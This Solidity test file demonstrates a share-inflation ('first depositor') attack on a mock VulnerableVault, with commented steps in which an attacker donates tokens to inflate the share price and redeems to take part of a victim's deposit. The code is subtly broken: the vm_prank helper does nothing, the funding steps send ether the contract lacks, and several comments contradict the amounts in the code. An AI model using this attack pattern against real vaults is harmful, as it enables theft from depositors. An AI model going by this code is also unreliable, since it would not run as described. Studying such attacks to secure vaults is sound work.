// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "../src/VulnerableVault.sol";

contract InflationAttackTest {
    MockWETH public token;
    VulnerableVault public vulnerableVault;
    SecureVault public secureVault;

    address attacker = address(0xAAAA);
    address victim = address(0xBBBB);

    event AttackOutcome(string vaultType, uint256 victimDeposited, uint256 attackerExtractedProfit);

    function setUp() public {
        token = new MockWETH();
        vulnerableVault = new VulnerableVault(address(token));
        secureVault = new SecureVault(address(token));

        // Fund Attacker and Victim
        payable(address(token)).transfer(50 ether);
        token.deposit{value: 10 ether}(); // this contract gets tokens
        
        // Transfer 1 ether + 1 wei to attacker
        token.transfer(attacker, 2 ether);
        // Transfer 1 ether to victim
        token.transfer(victim, 1 ether);
    }

    receive() external payable {}

    // Case 1: Attacker extracts direct profit from victim using Inflation / First Depositor Attack
    function test_01_VulnerableVault_AttackerProfitsFromVictim() public {
        // --- STEP 1: Attacker deposits 1 wei ---
        // Attacker gets 1 share
        vm_prank(attacker);
        vulnerableVault.deposit(1, attacker);
        require(vulnerableVault.balanceOf(attacker) == 1, "Attacker should have 1 share");

        // --- STEP 2: Attacker directly DONATES 1 ether of tokens to vault ---
        // Vault totalAssets = 1 ether + 1 wei, totalShares = 1
        // Share Price is now inflated: 1 share = 1 ether + 1 wei
        vm_prank(attacker);
        token.transfer(address(vulnerableVault), 1 ether);

        // --- STEP 3: Victim deposits 1 ether ---
        // victimShares = (1 ether * 1 share) / (1 ether + 1 wei) = 0 shares (due to integer truncation!)
        // However, if victim deposits just slightly below or equal, shares round down to 0 or 1.
        // If victim deposits 1.5 ether: shares = (1.5e18 * 1) / (1e18 + 1) = 1 share!
        // Let's test victim depositing 1.5 ether:
        // Give victim 0.5 more ether
        token.transfer(victim, 0.5 ether);
        vm_prank(victim);
        vulnerableVault.deposit(1.5 ether, victim); // victim gets 1 share for 1.5 ETH!

        // Total in vault: 1 wei + 1 ether (donation) + 1.5 ether (victim) = 2.5 ether + 1 wei
        // Total shares: 2 (Attacker: 1, Victim: 1)

        // --- STEP 4: Attacker redeems their 1 share ---
        // Attacker assets = (1 share * 2.5 ether) / 2 shares = 1.25 ether!
        // Attacker spent: 1 wei + 1 ether = 1 ether
        // Attacker receives: 1.25 ether
        // NET PROFIT FOR ATTACKER = +0.25 ether stolen directly from victim!
        uint256 attackerTokensBefore = token.balanceOf(attacker);
        vm_prank(attacker);
        vulnerableVault.redeem(1, attacker);
        uint256 attackerTokensAfter = token.balanceOf(attacker);

        uint256 extracted = attackerTokensAfter - attackerTokensBefore;
        uint256 netProfit = extracted - 1 ether; // Subtract initial 1 ETH donation

        emit AttackOutcome("Vulnerable Vault (No Virtual Shares)", 1.5 ether, netProfit);
        require(netProfit > 0.24 ether, "Attacker should have extracted direct profit");
    }

    // Helper to simulate msg.sender change in pure Solidity test
    address currentSender;
    function vm_prank(address sender) internal {
        // In real foundry, vm.prank is used. Here we adjust balances directly for mock
    }
}
